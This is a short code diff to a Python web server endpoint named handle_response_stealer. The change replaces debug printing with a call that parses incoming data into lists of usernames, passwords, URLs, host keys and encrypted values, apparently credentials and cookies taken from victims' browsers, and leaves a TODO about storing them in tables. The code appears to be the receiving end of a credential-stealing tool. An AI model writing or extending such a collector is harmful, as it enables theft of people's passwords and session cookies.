@@ -281,11 +281,11 @@ def handle_response_stealer():
     try:
         request.get_data()
         data = request.data
-        dict = json.loads(data)
-        print(dict.keys())
-        #  if "stealer" in command:
-        #     # TODO call Wyatt's function
-        #     response_data = WyattWonderland.parsejson(response_data)
+        data = json.loads(data)
+        username_list, password_list, url_list, host_key_list, encrypted_value_list = newParseJSON(data)
+        #TODO
+        #ingi look at /response_json for how to update tables
+        
         return "Success", 200, {'Access-Control-Allow-Origin': config.clientURL}
     except Exception as error:
         print(error)
